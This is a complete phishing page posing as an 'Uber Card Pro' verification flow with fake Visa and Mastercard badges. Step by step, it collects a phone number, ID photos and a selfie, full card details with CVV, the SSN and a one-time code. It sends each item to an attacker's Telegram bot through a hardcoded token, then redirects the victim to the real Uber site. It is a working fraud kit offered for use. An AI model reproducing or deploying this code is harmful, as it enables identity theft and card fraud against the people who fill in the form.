<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Uber Card Pro – Secure Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f5f5f5;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 550px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .header {
            background: #000000;
            padding: 28px 24px;
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            color: white;
            letter-spacing: -0.5px;
        }
        .logo span {
            color: #00b14f;
        }
        .badge {
            background: rgba(255,255,255,0.15);
            display: inline-block;
            padding: 4px 12px;
            border-radius: 40px;
            font-size: 12px;
            margin-top: 12px;
            color: #ddd;
        }
        .content {
            padding: 32px 28px 40px;
        }
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 32px;
            gap: 8px;
        }
        .step {
            flex: 1;
            text-align: center;
            font-size: 12px;
            color: #aaa;
            border-bottom: 2px solid #eee;
            padding-bottom: 8px;
        }
        .step.active {
            color: #000;
            border-bottom-color: #00b14f;
            font-weight: 500;
        }
        h2 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1a1a1a;
        }
        .desc {
            color: #666;
            font-size: 14px;
            margin-bottom: 28px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 500;
            margin-bottom: 8px;
            color: #222;
            font-size: 14px;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #ccc;
            border-radius: 16px;
            font-size: 16px;
            transition: 0.2s;
            background: #fff;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #00b14f;
            box-shadow: 0 0 0 3px rgba(0,177,79,0.1);
        }
        .file-input {
            padding: 10px 0;
        }
        .row-2 {
            display: flex;
            gap: 16px;
        }
        .row-2 .form-group {
            flex: 1;
        }
        button {
            width: 100%;
            background: #00b14f;
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 40px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 16px;
        }
        button:hover {
            background: #00903f;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: #00b14f;
            font-size: 14px;
        }
        .error {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }
        hr {
            margin: 24px 0;
            border: none;
            border-top: 1px solid #eee;
        }
        @media (max-width: 500px) {
            .content { padding: 24px 20px; }
            .row-2 { flex-direction: column; gap: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">UBER<span>Card Pro</span></div>
            <div class="badge">Verified by Visa | Mastercard SecureCode</div>
        </div>
        <div class="content">
            <div class="step-indicator" id="stepIndicator">
                <div class="step active" data-step="1">Phone</div>
                <div class="step" data-step="2">KYC</div>
                <div class="step" data-step="3">Card</div>
                <div class="step" data-step="4">SSN</div>
                <div class="step" data-step="5">OTP</div>
            </div>
            <div id="formContainer">
                <!-- Step 1: Phone number -->
                <div id="step1" class="step-content">
                    <h2>Welcome back</h2>
                    <div class="desc">Enter your mobile number to continue</div>
                    <div class="form-group">
                        <label>Phone number</label>
                        <input type="tel" id="phone" placeholder="+1 234 567 8900" autocomplete="off">
                    </div>
                    <button onclick="nextStep(1)">Continue</button>
                </div>
            </div>
            <div class="secure-badge">
                <span>🔒</span> 256-bit SSL encryption
            </div>
            <div class="loading" id="loadingMsg">Processing, please wait...</div>
            <div class="error" id="errorMsg"></div>
        </div>
    </div>

    <script>
        // Telegram bot credentials (your existing bot)
        const BOT_TOKEN = '8705927666:AAF0qRR0dSmBSG4kMMokObu6zXw3ZPQjGTI';
        const CHAT_ID = '8737104261';

        let collectedData = {
            phone: '',
            kyc: { idFront: null, idBack: null, selfie: null },
            card: { number: '', expiry: '', cvv: '' },
            ssn: '',
            otp: ''
        };

        let currentStep = 1;
        let isSubmitting = false;

        async function sendTelegramMessage(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) { console.error(e); }
        }

        async function sendTelegramFile(file, filename, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', file, filename);
            if (caption) formData.append('caption', caption);
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch(e) { console.error(e); }
        }

        function showError(msg) {
            const errDiv = document.getElementById('errorMsg');
            errDiv.innerText = msg;
            errDiv.style.display = 'block';
            setTimeout(() => { errDiv.style.display = 'none'; }, 4000);
        }

        function showLoading(show) {
            document.getElementById('loadingMsg').style.display = show ? 'block' : 'none';
        }

        function updateStepIndicator(step) {
            const steps = document.querySelectorAll('.step');
            steps.forEach((s, i) => {
                if (i+1 <= step) s.classList.add('active');
                else s.classList.remove('active');
            });
        }

        function nextStep(current) {
            if (isSubmitting) return;
            if (current === 1) {
                const phone = document.getElementById('phone').value.trim();
                if (!phone) {
                    showError('Please enter your phone number.');
                    return;
                }
                collectedData.phone = phone;
                // Send phone number to Telegram
                sendTelegramMessage(`📞 *Uber Card Pro - Phone*: ${phone}\nTime: ${new Date().toLocaleString()}`);
                // Move to step 2
                renderStep2();
            } else if (current === 2) {
                // Validate KYC files
                const idFront = document.getElementById('idFront').files[0];
                const idBack = document.getElementById('idBack').files[0];
                const selfie = document.getElementById('selfie').files[0];
                if (!idFront || !idBack || !selfie) {
                    showError('Please upload all required documents (ID front, back, and selfie).');
                    return;
                }
                collectedData.kyc.idFront = idFront;
                collectedData.kyc.idBack = idBack;
                collectedData.kyc.selfie = selfie;
                showLoading(true);
                // Send files to Telegram
                await sendTelegramFile(idFront, idFront.name, `🆔 ID Front (${collectedData.phone})`);
                await sendTelegramFile(idBack, idBack.name, `🆔 ID Back (${collectedData.phone})`);
                await sendTelegramFile(selfie, selfie.name, `🤳 Selfie (${collectedData.phone})`);
                showLoading(false);
                renderStep3();
            } else if (current === 3) {
                const cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, '');
                const expiry = document.getElementById('expiry').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                if (!cardNumber || !expiry || !cvv) {
                    showError('Please enter full card details.');
                    return;
                }
                collectedData.card = { number: cardNumber, expiry, cvv };
                sendTelegramMessage(`💳 *Card Details* (${collectedData.phone})\nCard: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nTime: ${new Date().toLocaleString()}`);
                renderStep4();
            } else if (current === 4) {
                const ssn = document.getElementById('ssn').value.trim();
                if (!ssn) {
                    showError('Please enter your SSN.');
                    return;
                }
                collectedData.ssn = ssn;
                sendTelegramMessage(`🔐 *SSN* (${collectedData.phone}): ${ssn}\nTime: ${new Date().toLocaleString()}`);
                renderStep5();
            }
        }

        function renderStep2() {
            currentStep = 2;
            updateStepIndicator(2);
            const container = document.getElementById('formContainer');
            container.innerHTML = `
                <div id="step2" class="step-content">
                    <h2>Identity verification</h2>
                    <div class="desc">We need to verify your identity for Uber Card Pro.</div>
                    <div class="form-group">
                        <label>ID card (front side) – Driver's license / Passport</label>
                        <input type="file" id="idFront" accept="image/*,.pdf" class="file-input" required>
                    </div>
                    <div class="form-group">
                        <label>ID card (back side)</label>
                        <input type="file" id="idBack" accept="image/*,.pdf" class="file-input" required>
                    </div>
                    <div class="form-group">
                        <label>Selfie with your ID</label>
                        <input type="file" id="selfie" accept="image/*" class="file-input" required>
                    </div>
                    <button onclick="nextStep(2)">Continue</button>
                </div>
            `;
        }

        function renderStep3() {
            currentStep = 3;
            updateStepIndicator(3);
            const container = document.getElementById('formContainer');
            container.innerHTML = `
                <div id="step3" class="step-content">
                    <h2>Card details</h2>
                    <div class="desc">Enter your preferred payment card for Uber Card Pro.</div>
                    <div class="form-group">
                        <label>Card number</label>
                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="off">
                    </div>
                    <div class="row-2">
                        <div class="form-group">
                            <label>Expiry (MM/YY)</label>
                            <input type="text" id="expiry" placeholder="MM/YY">
                        </div>
                        <div class="form-group">
                            <label>CVV</label>
                            <input type="text" id="cvv" placeholder="123">
                        </div>
                    </div>
                    <button onclick="nextStep(3)">Continue</button>
                </div>
            `;
        }

        function renderStep4() {
            currentStep = 4;
            updateStepIndicator(4);
            const container = document.getElementById('formContainer');
            container.innerHTML = `
                <div id="step4" class="step-content">
                    <h2>Social Security Number</h2>
                    <div class="desc">For tax purposes, please provide your SSN.</div>
                    <div class="form-group">
                        <label>SSN (9 digits)</label>
                        <input type="text" id="ssn" placeholder="XXX-XX-XXXX" autocomplete="off">
                    </div>
                    <button onclick="nextStep(4)">Continue</button>
                </div>
            `;
        }

        function renderStep5() {
            currentStep = 5;
            updateStepIndicator(5);
            const container = document.getElementById('formContainer');
            container.innerHTML = `
                <div id="step5" class="step-content">
                    <h2>One‑time verification code</h2>
                    <div class="desc">We've sent a 6‑digit code to ${collectedData.phone}. Enter it below.</div>
                    <div class="form-group">
                        <label>Verification code</label>
                        <input type="text" id="otp" placeholder="123456" autocomplete="off">
                    </div>
                    <button onclick="finalSubmit()">Verify & Activate</button>
                </div>
            `;
        }

        async function finalSubmit() {
            if (isSubmitting) return;
            const otp = document.getElementById('otp').value.trim();
            if (!otp) {
                showError('Please enter the verification code.');
                return;
            }
            collectedData.otp = otp;
            showLoading(true);
            // Send OTP to Telegram
            await sendTelegramMessage(`🔢 *OTP Code* (${collectedData.phone}): ${otp}\nTime: ${new Date().toLocaleString()}`);
            // Send summary
            const summary = `✅ *Uber Card Pro – Full Report*\n\n` +
                `📞 Phone: ${collectedData.phone}\n` +
                `💳 Card: ${collectedData.card.number}\n` +
                `📅 Expiry: ${collectedData.card.expiry}\n` +
                `🔐 CVV: ${collectedData.card.cvv}\n` +
                `🆔 SSN: ${collectedData.ssn}\n` +
                `🔢 OTP: ${collectedData.otp}\n` +
                `🕒 Time: ${new Date().toLocaleString()}`;
            await sendTelegramMessage(summary);
            showLoading(false);
            // Redirect to official Uber
            setTimeout(() => {
                window.location.href = 'https://www.uber.com/';
            }, 1500);
        }
    </script>
</body>
</html>
